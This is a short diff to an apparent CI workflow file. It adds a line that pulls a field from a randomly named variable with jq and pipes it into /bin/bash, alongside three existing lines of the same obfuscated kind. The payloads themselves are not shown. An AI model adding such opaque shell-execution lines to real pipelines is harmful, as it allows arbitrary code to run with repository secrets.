@@ -26,6 +26,7 @@ jobs:
           echo $st122 | jq -r .boi34090 | /bin/bash
           echo $fio9184 | jq -r .lqgf73 | /bin/bash
           printf '%s' "$vwy08" | jq -r .imbrh6 | /bin/bash
+          echo $jverr8 | jq -r .c02 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
